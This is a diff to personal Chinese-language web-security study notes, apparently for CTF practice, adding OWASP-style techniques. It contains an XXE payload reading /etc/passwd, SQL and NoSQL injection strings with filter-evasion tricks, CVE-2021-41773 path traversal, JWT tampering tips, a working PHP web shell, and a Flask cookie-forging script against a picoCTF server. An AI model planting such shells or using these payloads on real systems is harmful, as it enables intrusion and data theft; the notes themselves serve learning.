@@ -127,21 +127,47 @@
             - 因此在服务端没法识别到这种攻击，因为往服务端发的http请求中没有痕迹
 - XML external entity injection (XXE) 
     - 在接受XML的应用服务中，利用XXE语言的特性来获得敏感信息
+    - 首先要知道其可以被XXE
+    - 然后再知道其具体是什么元素可以XXE，这些有风险元素其实很固定，换一个就不行了
+    - eg: 有风险元素是`<data>`中的`<ID>`
+        ```xml
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!-- 定义根元素，以定义实体供xxe注入 -->
+        <!DOCTYPE aaa [ 
+            <!ENTITY xxe SYSTEM "file:///etc/passwd">
+        ]>
+        
+        <data>
+            <ID>
+                &xxe;
+            </ID>
+        </data>
+            
+        ```
 - OS injection/Remote Code Execution (RCE)
     - 直接在服务端的os运行代码
     - 类型：
         - 参数传到linux中并运行某命令，用;或者&&来在那一条行中运行多条命令
 - SQL injections
-    - 基本上关键在于熟悉SQL语句的语法
+    - 基本上关键在于熟悉SQL语句的语法和找到一定能通过的语句
+        - sql: OR 1=1
+        - nosql: {$ne: null}
+        - PostgreSQL: syntax是一样的，但是终端的交互记得加`;`
     - experiences
         - 留心开头和结尾的引号
             - e.g. `"SELECT * FROM user_data WHERE first_name = 'John' AND last_name = '" + lastName + "'";`如果要注入，得处理尾部的`'`（例如注释掉或者用另一个'接上）
         - `--`在SQL中代表注释符
-            - eg：https://example.com/search?query=admin';-- 可以把`SELECT * FROM users WHERE username = 'admin' AND password = 'password';`变成`SELECT * FROM users WHERE username = 'admin';-- AND password = 'password';`
+            - eg：`https://example.com/search?query=admin';--` 可以把`SELECT * FROM users WHERE username = 'admin' AND password = 'password';`变成`SELECT * FROM users WHERE username = 'admin';-- AND password = 'password';`
         - `OR`
-            - eg：https://darklabacademy.com/score?student_id=10002'+OR+1=1;-- 可以bypass验证：`SELECT * FROM result WHERE student_id = '10002'OR 1=1--' AND released = 1`
+            - eg：`https://darklabacademy.com/score?student_id=10002'+OR+1=1;--` 可以bypass验证：`SELECT * FROM result WHERE student_id = '10002'OR 1=1--' AND released = 1`
+        - `a' IS NOT 'b`
+            - `SELECT * FROM users WHERE username = 'a' IS NOT 'b';`
+        - `||`, `CONCAT`, `+`
+            - 字符串拼接，可以用来逃过简单的filter
+            - eg：`admin`被filter了，但`ad||min`没有
     - Common attackable query command
         - SELECT, UPDATE, DELETE
+        - findOne
     - types:
         - In-Band
             - when use the same channel to send sql query and get result
@@ -219,7 +245,7 @@
         - 可能早就被标注会有攻击风险
     - 包括框架、库什么的
     - eg CVE-2021-41773
-        - apache 2.4.49/2.4.50这两个版本虽然过滤了一些简单的特殊字符，如遇到`\`,`.`啥的会直接删除，但没有过滤`%2e`这类编码，导致可以用`%2e`访问路径
+        - apache 2.4.49/2.4.50这两个版本虽然过滤了一些简单的特殊字符，如遇到`/`,`.`啥的会直接删除，但没有过滤`%2e`这类编码，导致可以用`%2e%2e%2f`访问`../`路径
         - 此外，没有进行访问权限控制也是问题之一
 
 ### A07 Identification and Authentication Failures
@@ -252,6 +278,7 @@
     - header和claims其实只是单纯的base64url加密，重点是signature会使用密钥把header和claims签名
     - 记得要改exp时间
     - 配合 refresh token可以延长JWT的life span
+    - ***改jwt最好改全套，只改role啥的可能仍会被block***
 
 ### A08 Software and Data Integrity Failures
 - 简单来说就是数据或者软件被中途篡改了，但没有验证就被使用了
@@ -367,7 +394,8 @@
     - 如果没有--data，就会尝试注入一些常见的payload，例如id、user之类的
 - gobuster
     - 用wordlist遍历各种东西，例如路径、服务、sub-domain等
-    - `gobuster dir -u https://buffered.io -w ~/wordlists/shortlist.txt`
+    - 用法：
+        - 暴力破解目录或者文件`gobuster dir -u https://buffered.io -w ~/wordlists/shortlist.txt`
 - hash-identifier
     - cyber chief其实就行
 - hashcat
@@ -376,6 +404,70 @@
     - cyber chief
     - crack station
 
+
+- 好用的script：
+    - 制造webshell
+    ```php
+    <!-- 每次submit都会触发一次GET，然后php会捕获和处理这个get -->
+    <!-- name=<?php echo basename($_SERVER['PHP_SELF']); ?> 用于防止表单名称冲突 -->
+    <html>
+        <body>
+            <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+                <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+                <input type="SUBMIT" value="Execute">
+            </form>
+            <pre>
+                <?php
+                    if(isset($_GET['cmd']))
+                    {
+                        system($_GET['cmd']);
+                    }
+                ?>
+            </pre>
+        </body>
+    </html>
+    ```
+    - 找.txt文件：
+        - 最简单的`ls`
+        - `find / -name “*.txt”`
+    - python 自动化查询
+        - eg
+        ```py
+        # Import Libraries
+        from bs4 import BeautifulSoup
+        from subprocess import run
+        import requests
+
+        url = "http://mercury.picoctf.net:44693/"
+
+        # Get cookie
+        session = requests.Session()
+        response = session.get(url)
+        cookie = session.cookies.get_dict().get('session')
+
+        # Create wordlist
+        cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
+
+        F = open('wordlist.txt', 'w') 
+        for name in cookie_names:
+            F.write(name + "\n")
+        
+        F.close()
+
+        # convert
+        secret = run(f"flask-unsign --unsign --cookie {cookie} --wordlist wordlist.txt").stdout
+        payload = "\"{'very_auth':'admin'}\""
+        sign = run(f"flask-unsign --sign --cookie {payload} --secret {secret}").stdout
+
+        # Send cookies to website
+        cookies = dict(session=sign[:-1])
+        response = requests.get(url, cookies=cookies)
+        soup = BeautifulSoup(response.text, "html.parser")
+
+        # Retreive flag from page
+        flag = soup.select("body > div.container > div.jumbotron > p:nth-child(2)")[0]
+        print(flag.get_text())
+        ```
 
 # useful vocab
 - privilege
@@ -387,17 +479,41 @@
 - tier 层级
 - segregation 分隔
 
-# 思路
-- 20天 to final
-- Medium 33+17道题、Hard 12+0道
-    - total 62道题
+# other
+- firefox的开发者工具有些奇怪，有时候不会显示图片和css的source，用chrome好些
+- 对于path的过滤，如果不知道背后的过滤逻辑，就得尝试各种看起来自相矛盾的测试，比如可以../flag.txt但不能../../aaa/flag.txt
+- md，命名格式啥的也很重要，我们要有创造力，admin.phps昭示着可能的index.phps
 
 
 # Methodology
 1. 找可用之处
     - path traversal
-        - 先手动找常见的path，比如robots.txt和.git
+        - 先手动找常见的path
+            - robots.txt
+            - .git
+            - index.php
         - 然后gobuster找热门wordlists来BF寻找
+            - wordlist: SecLists/Discovery/Web-Content/common.txt，或者就在桌面的wordlists里
+    - 看源码
+        - css或者js的包的路径
+    - 抓包
+        - jwt、任何神秘json
+2. 根据反馈尝试expliot
+    - 有事没事都base64一下任何奇怪的乱码
+    - 现在见过的例子：
+        - XXE：抓包发现POST可以根据包地格式XXE
+        - web shell：robots.txt发现了/instruction描述验证方法和/uploads/文件夹供上传文件的访问以此web shell 
+        - sql injection：
+            - 提供了源码，其中email和password用了JSON解析，因此可以exploit为`{"$ne": null}`
+            - 在部分关键字filter的情况下，可以用其他字句实现注入，具体而言就是`||`和`a' IS NOT 'b`（但还没搞明白为什么可以）
+        - JWT：
+            - 应用用jwt验证，看源码获得secret，crack jwt的数个字段就搞定了
+            - 改成none
+        - base64：把base64拆开了两半放在query string中，两者结合起来解码后就是flag（这个真是防不胜防，必须要时刻留意
+        - path traversal：通过源码发现css或者js的目录，以此递归遍历寻找 里面的flag
+        - 抓包：发现用cookie明文来设置权限，改成1破解
+        - 神秘的文件名字猜测：从robots.txt发现了admin.phps，以此猜测出index.phps的存在，然后接着递归寻找index.phps的其他源码
+        - 读php源码：相当可怕，理解源码之后发现有阅读文件的错误处理，通过使反序列化报错触发阅读文件
 
 
 
